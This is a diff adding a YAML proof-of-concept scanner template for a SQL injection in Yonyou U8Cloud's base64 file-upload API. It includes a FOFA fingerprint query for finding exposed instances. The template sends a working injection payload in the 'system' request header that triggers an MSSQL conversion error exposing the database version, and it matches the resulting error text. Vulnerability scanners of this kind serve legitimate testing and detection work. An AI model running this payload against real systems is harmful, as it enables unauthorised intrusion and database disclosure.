@@ -1,0 +1,17 @@
+id: poc-yaml-yongyou-u8cloud-base64-sqli
+info:
+  name: 用友U8Cloud base64 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8Cloud
+  fofa: app="用友-U8-Cloud"
+requests:
+- method: GET
+  path: /u8cloud/api/file/upload/base64
+  headers:
+    system: -1' or 1=@@version--
+  expression: status_code == 200 && contains(body,"Microsoft SQL Server") && contains(body,"在将
+    nvarchar 值") && contains(body,"转换成数据类型 int 时失败") && contains(content_type,"application/json")
+variables: {}
+transport: http
